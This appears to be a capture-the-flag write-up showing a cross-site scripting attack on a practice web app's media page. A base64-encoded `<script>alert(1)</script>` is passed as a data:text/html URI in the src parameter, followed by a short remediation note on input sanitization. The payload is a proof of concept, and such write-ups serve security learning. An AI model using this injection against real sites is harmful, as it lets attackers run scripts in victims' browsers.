# 07_cross_site_scripting_2

Able to execute custom js.

## Method

Go to `/?page=media&src=nsa`
Homepage > Click on the 2nd NSA image

Write a script and convert it to base64.

Using https://www.base64encode.org/

`<script>alert(1)</script>` > `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

Edit the url, change the source param to `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` then submit

## Explanation

Be sure to sanitize all of your inputs including input from the url to prevent custom scripts from being executed, people can run their own malicious custom scripts otherwise.
